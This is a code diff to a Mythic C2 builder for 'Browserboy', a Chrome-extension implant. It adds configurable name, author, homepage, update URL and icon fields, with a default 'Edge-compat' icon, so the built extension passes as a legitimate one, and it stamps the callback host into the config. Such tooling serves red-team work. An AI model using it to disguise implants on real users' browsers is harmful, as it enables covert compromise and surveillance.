@@ -5,6 +5,12 @@ from mythic_container.MythicRPC import *
 from mythic_container.PayloadBuilder import *
 
 from .packaging import (
+    DEFAULT_EXTENSION_AUTHOR,
+    DEFAULT_EXTENSION_DESCRIPTION,
+    DEFAULT_EXTENSION_NAME,
+    DEFAULT_EXTENSION_SHORT_NAME,
+    DEFAULT_HOMEPAGE_URL,
+    DEFAULT_UPDATE_URL,
     KNOWN_COMMANDS,
     _as_bool,
     aespsk_mode,
@@ -36,14 +42,26 @@ class Browserboy(PayloadType):
         BuildParameter(
             name="name",
             parameter_type=BuildParameterType.String,
-            description="Chrome extension name",
-            default_value="browserboy",
+            description="Chrome extension display name",
+            default_value=DEFAULT_EXTENSION_NAME,
+        ),
+        BuildParameter(
+            name="short_name",
+            parameter_type=BuildParameterType.String,
+            description="Short name on the toolbar",
+            default_value=DEFAULT_EXTENSION_SHORT_NAME,
         ),
         BuildParameter(
             name="description",
             parameter_type=BuildParameterType.String,
             description="Chrome extension description",
-            default_value="Browser helper",
+            default_value=DEFAULT_EXTENSION_DESCRIPTION,
+        ),
+        BuildParameter(
+            name="author",
+            parameter_type=BuildParameterType.String,
+            description="Chrome extension author field",
+            default_value=DEFAULT_EXTENSION_AUTHOR,
         ),
         BuildParameter(
             name="version",
@@ -55,13 +73,19 @@ class Browserboy(PayloadType):
             name="homepage_url",
             parameter_type=BuildParameterType.String,
             description="homepage_url in the manifest",
-            default_value="https://example.com",
+            default_value=DEFAULT_HOMEPAGE_URL,
         ),
         BuildParameter(
             name="update_url",
             parameter_type=BuildParameterType.String,
             description="update_url in the manifest",
-            default_value="https://example.com/update.xml",
+            default_value=DEFAULT_UPDATE_URL,
+        ),
+        BuildParameter(
+            name="icon",
+            parameter_type=BuildParameterType.File,
+            description="Optional 128x128 PNG. Empty uses the bundled Edge-compat icon.",
+            required=False,
         ),
         BuildParameter(
             name="minify",
@@ -76,7 +100,7 @@ class Browserboy(PayloadType):
     build_steps = [
         BuildStep(step_name="Gathering Files", step_description="Copy extension sources"),
         BuildStep(step_name="Validating C2", step_description="Require HTTP with AESPSK=none"),
-        BuildStep(step_name="Stamping", step_description="Write config, manifest, and command registry"),
+        BuildStep(step_name="Stamping", step_description="Write config, manifest, icon, and command registry"),
         BuildStep(step_name="Minifying", step_description="Minify stamped JavaScript with rjsmin"),
         BuildStep(step_name="Packaging", step_description="Zip the unpacked extension"),
     ]
@@ -139,7 +163,7 @@ class Browserboy(PayloadType):
                 return resp
             await self._step("Validating C2", True, "http AESPSK=none")
 
-            extension_name = self.get_parameter("name")
+            extension_name = self.get_parameter("name") or DEFAULT_EXTENSION_NAME
             config = build_agent_config(
                 self.uuid,
                 params,
@@ -147,11 +171,24 @@ class Browserboy(PayloadType):
             )
             manifest_fields = {
                 "name": extension_name,
-                "description": self.get_parameter("description"),
-                "version": self.get_parameter("version"),
-                "homepage_url": self.get_parameter("homepage_url"),
-                "update_url": self.get_parameter("update_url"),
+                "short_name": self.get_parameter("short_name") or DEFAULT_EXTENSION_SHORT_NAME,
+                "description": self.get_parameter("description") or DEFAULT_EXTENSION_DESCRIPTION,
+                "author": self.get_parameter("author") or DEFAULT_EXTENSION_AUTHOR,
+                "version": self.get_parameter("version") or "1.0.0",
+                "homepage_url": self.get_parameter("homepage_url") or DEFAULT_HOMEPAGE_URL,
+                "update_url": self.get_parameter("update_url") or DEFAULT_UPDATE_URL,
             }
+
+            icon_png = None
+            icon_id = self.get_parameter("icon")
+            if icon_id:
+                file_resp = await SendMythicRPCFileGetContent(
+                    MythicRPCFileGetContentMessage(AgentFileId=icon_id)
+                )
+                if not file_resp.Success:
+                    resp.build_stderr = f"failed to read icon file: {file_resp.Error}"
+                    return resp
+                icon_png = file_resp.Content
 
             minify = _as_bool(self.get_parameter("minify"))
             with tempfile.TemporaryDirectory(prefix="browserboy-") as tmp:
@@ -163,6 +200,7 @@ class Browserboy(PayloadType):
                     manifest_fields=manifest_fields,
                     command_names=selected,
                     minify=minify,
+                    icon_png=icon_png,
                 )
                 await self._step("Stamping", True, f"host={config['callback_host']}:{config['callback_port']}")
                 await self._step(
